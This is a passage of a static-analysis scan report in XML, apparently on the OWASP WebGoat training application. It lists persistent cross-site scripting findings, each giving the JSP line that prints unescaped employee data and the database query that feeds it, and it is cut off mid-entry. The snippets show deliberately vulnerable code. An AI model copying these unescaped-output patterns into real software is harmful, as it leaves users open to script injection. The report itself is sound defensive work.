				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1FA62B188B21D8B699B65D01D43AC262" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="49264C6368DF63E47B62BFDB742CA685" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;%=employee.getLastName()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="292951B79151C88731A04B217D96C00B" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getPhoneNumber()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="517D0521C78497633EC6D1B0481B6F88" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 110 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>110</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F63505A3201A0475E71FF858B102D1D6" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getPhoneNumber()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E2BCC505FDFA649C86BECE592591DC2F" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 91 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>91</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getDisciplinaryActionDate()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="27E036FA124E4BFCF5FD24ABA5D5F81C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>				&lt;TR&gt;
					&lt;TD colspan="4"&gt;
						&lt;textarea name="&lt;%=RoleBasedAccessControl.DISCIPLINARY_NOTES%&gt;" cols="53" rows="2" wrap="off" class="lesson_text_db" &gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/textarea&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8D8A90F8ABA9B0C8C3E009D92E8AD9DC" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B6D900329D00314BF38A530AF1C8EA31" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getFirstName()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="16BF714FE7C3781B354FB65B606B5D11" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 109 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>109</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.DISCIPLINARY_DATE%&gt;" type="text" value="&lt;%=employee.getDisciplinaryActionDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1160F0919959C4D31A1DE51F4A3285F4" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 40 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>40</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.PHONE_NUMBER%&gt;" type="text" value="&lt;%=employee.getPhoneNumber()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="18D7F832AF0EBC70F275B289812EFC5D" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7BE3E12694022AFD9AF323451FEC105E" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>WSDLScanning.java의 createContent() 메서드가 221 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>221</LineStart>
<Snippet>		header.addElement(new TD().addElement(fields[i]));
		results.addElement(new TD()
			.addElement((String) accessWGService("WSDLScanning",
				fields[i], "acct_num", new Integer(id))));
	    }</Snippet>
<TargetFunction>org.apache.ecs.html.TD.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>150</LineStart>
<Snippet>	    call.setTargetEndpointAddress("http://localhost/WebGoat/services/"
		    + serv);
	    Object result = call.invoke(new Object[] { parameterValue });
	    return result;
	}</Snippet>
<TargetFunction>org.apache.axis.client.Call.invoke()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0272FD9088CF1862A346729E67055EA0" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 71 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>71</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getCcn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DBA2CC40804A42242D000D50609F1C12" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD colspan="3"&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getPersonalDescription()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="417A116F70901DCB19F2EA00244F74F4" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7416C5D48F7DEE2868B4143A841D0501" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 109 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>109</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.DISCIPLINARY_DATE%&gt;" type="text" value="&lt;%=employee.getDisciplinaryActionDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DECC837BC713D3EFA6BDF66991A485E2" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 123 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>123</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=CrossSiteScripting.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=CrossSiteScripting.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=CrossSiteScripting.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5FA5419B4ADFEC5022864650CF51D736" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.ADDRESS1%&gt;" type="text" value="&lt;%=employee.getAddress1()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3993826383C14F72E3E87E1F182A78FB" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 51 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>51</LineStart>
<Snippet>					&lt;/TD&gt;
